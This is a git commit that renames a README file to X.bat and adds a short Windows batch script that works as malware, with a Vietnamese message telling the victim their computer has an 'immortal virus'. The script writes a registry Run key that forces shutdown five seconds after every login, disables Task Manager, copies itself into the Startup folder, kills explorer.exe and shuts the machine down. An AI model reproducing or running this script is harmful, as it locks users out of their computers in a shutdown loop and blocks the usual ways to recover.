afbfedb76517909e75886f72ffa2f27043117aa3
daccong <75686221+daccong@users.noreply.github.com>
2020-12-08 22:52:01 +0700

    Update and rename README.md to X.bat

---
+++ X.bat
@@ -0,0 +1,15 @@
+
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v shutdown /t REG_SZ /d "shutdown.exe -f -s -t 05" /f
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskmgr /t REG_DWORD /d 1 /f
+cls
+copy thelove.bat "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\"
+cls
+taskkill /f /im explorer.exe
+cls
+shutdown.exe -f -s -t 05 -c "your computer will turn off after 5s ..."
+cls
+@echo off
+echo Warning!!!!!!!!May Tinh Cua Ban Da Bi Nhiem Virus Bat Diet !!!!!!!!!
+echo GOOD BYE 
+pause
+del Mr.Boss.bat
